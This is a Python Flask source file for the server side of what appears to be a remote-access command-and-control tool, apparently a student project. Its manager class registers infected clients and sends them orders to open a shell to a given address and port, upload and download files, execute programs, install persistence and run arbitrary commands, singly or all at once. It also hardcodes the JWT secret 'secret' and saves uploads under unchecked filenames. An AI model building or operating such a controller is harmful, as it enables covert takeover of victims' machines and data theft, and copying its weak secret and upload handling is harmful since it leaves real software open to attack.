from flask import request, send_file, send_from_directory, safe_join, abort
import uuid
import time
import jwt
import os.path
import base64
import collections
from threading import Thread
from .myclient import client
import logging
import sys 


MAX_LEN_JOB=10
JWT_SECRET="secret"

def encodeJwt(token):
    return jwt.encode(token,JWT_SECRET,'HS256')

def decodeJwt(token):
    try:
        result=jwt.decode(token,JWT_SECRET,'HS256')
        return result,True
    except jwt.exceptions.PyJWTError:
        return None,False

def startServer(app,verbose=False):
    print("[SERVER] is is starting...")
    if not verbose:
        #disables startup message lol
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None
        app.logger.disabled=True
        log = logging.getLogger('werkzeug')
        log.disabled = True

    print("[SERVER] has loaded ..")
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
    

class manager:
    def __init__(self):
        #UID->client
        self.clientList=collections.OrderedDict()
        

    def getClients(self):
        return self.clientList

    def register(self,ip=""):
        new_uid=uuid.uuid4().hex
        c=client(new_uid,ip)
        self.clientList[new_uid]=c
        print("registrado",self.clientList)
        return encodeJwt({"uid":new_uid}),True      

    def getCmd(self,uid):
        return self.clientList[uid].getCmd()
        
    def getFile(self,uid):
        print("getting gui",self.clientList[uid])
        return self.clientList[uid].getFile()

    def report(self,uid,result):
        print("reporting",uid,result)
        self.clientList[uid].report(result) 

    def saveFile(self,uid,file):
        #TODO makes checks and other stuffs
        file.save("uploads/"+file.filename)
        return "Ok",200

        

    ########################## actions RPC ############################
    def getClientByIndex(self,clientUid):
        print("uid",clientUid)
        return list(self.clientList.items())[clientUid][1]

    #all 6 requirements
    def displayClients(self):
        r ="displaying clients: \n"
        #print("dict client:",self.clientList)
        
        for i in range(len(self.clientList.items())):
            r+="cliente %i  = %s \n"%(i,self.getClientByIndex(i))
        
        return r


    def abrirShell(self,uid,addr,port):
        self.getClientByIndex(uid).openShell(addr,port)

    def sendFile(self,fname,clientuid=0):
        #do it for all
        if clientuid==-1:
            for uid in self.clientList:
                self.clientList[uid].sendFile(fname)
        else:
            if clientuid in self.clientList:
                self.clientList[clientuid].sendFile(fname)

    def downloadFile(self,fname,clientuid=0):
        if clientuid==-1:
            for uid in self.clientList:
                self.clientList[uid].writefile(fname)
        else:
            if clientuid in self.clientList:
                self.clientList[clientuid].writefile(fname)

    def executeProgram(self,fname,clientuid=0):
        if clientuid==-1:
            for uid in self.clientList:
                self.clientList[uid].executeProgram(fname)
        else:
            if clientuid in self.clientList:
                self.clientList[clientuid].executeProgram(fname)

    def installPersistency(self,clientuid=0):
        if clientuid==-1:
            for uid in self.clientList:
                self.clientList[uid].installPersistency()
        else:
            if clientuid in self.clientList:
                self.clientList[clientuid].installPersistency()

    def runCommand(self,cmd,clientuid=0):
        cmdList=[cmd]
        if clientuid==-1:
            for uid in self.clientList:
                self.clientList[uid].runCommand(cmdList)
        else:
            if clientuid in self.clientList:
                self.clientList[clientuid].runCommand(cmdList)


















